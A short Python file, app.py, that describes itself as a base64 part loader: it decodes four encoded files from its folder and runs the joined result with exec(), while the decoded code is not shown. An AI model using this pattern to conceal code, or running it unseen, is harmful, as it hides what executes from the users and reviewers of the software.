"""app.py - base64 part loader"""
import pathlib, base64
_r = pathlib.Path(__file__).resolve().parent
_parts = []
for i in range(4):
    _parts.append(base64.b64decode((_r / ("_qb%d.b64" % i)).read_text(encoding="utf-8")))
_src = b"".join(_parts).decode("utf-8")
exec(compile(_src, str(_r / "app.py"), "exec"), globals())
